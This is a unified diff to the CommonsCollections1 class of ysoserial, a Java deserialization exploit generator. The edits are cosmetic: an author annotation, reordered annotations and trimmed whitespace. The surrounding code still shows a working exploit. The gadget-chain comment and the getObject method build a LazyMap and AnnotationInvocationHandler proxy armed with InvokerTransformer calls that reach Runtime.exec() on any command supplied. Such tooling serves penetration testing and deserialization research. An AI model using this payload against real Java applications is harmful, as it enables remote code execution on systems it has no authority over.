@@ -10,6 +10,7 @@ import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InvokerTransformer;
 import org.apache.commons.collections.map.LazyMap;
 
+import ysoserial.payloads.annotation.Authors;
 import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.annotation.PayloadTest;
 import ysoserial.payloads.util.Gadgets;
@@ -18,7 +19,7 @@ import ysoserial.payloads.util.PayloadRunner;
 import ysoserial.payloads.util.Reflections;
 
 /*
-	Gadget chain:	
+	Gadget chain:
 		ObjectInputStream.readObject()
 			AnnotationInvocationHandler.readObject()
 				Map(Proxy).entrySet()
@@ -27,23 +28,24 @@ import ysoserial.payloads.util.Reflections;
 							ChainedTransformer.transform()
 								ConstantTransformer.transform()
 								InvokerTransformer.transform()
-									Method.invoke()				
+									Method.invoke()
 										Class.getMethod()
 								InvokerTransformer.transform()
 									Method.invoke()
 										Runtime.getRuntime()
 								InvokerTransformer.transform()
 									Method.invoke()
-										Runtime.exec()										
-	
+										Runtime.exec()
+
 	Requires:
 		commons-collections
  */
 @SuppressWarnings({"rawtypes", "unchecked"})
-@Dependencies({"commons-collections:commons-collections:3.1"})
 @PayloadTest ( precondition = "isApplicableJavaVersion")
+@Dependencies({"commons-collections:commons-collections:3.1"})
+@Authors({ Authors.FROHOFF })
 public class CommonsCollections1 extends PayloadRunner implements ObjectPayload<InvocationHandler> {
-	
+
 	public InvocationHandler getObject(final String command) throws Exception {
 		final String[] execArgs = new String[] { command };
 		// inert chain for setup
@@ -65,20 +67,20 @@ public class CommonsCollections1 extends PayloadRunner implements ObjectPayload<
 		final Map innerMap = new HashMap();
 
 		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
-		
+
 		final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
-		
+
 		final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);
-		
-		Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain	
-				
+
+		Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain
+
 		return handler;
 	}
-	
+
 	public static void main(final String[] args) throws Exception {
 		PayloadRunner.run(CommonsCollections1.class, args);
 	}
-	
+
 	public static boolean isApplicableJavaVersion() {
         return JavaVersion.isAnnInvHUniversalMethodImpl();
     }
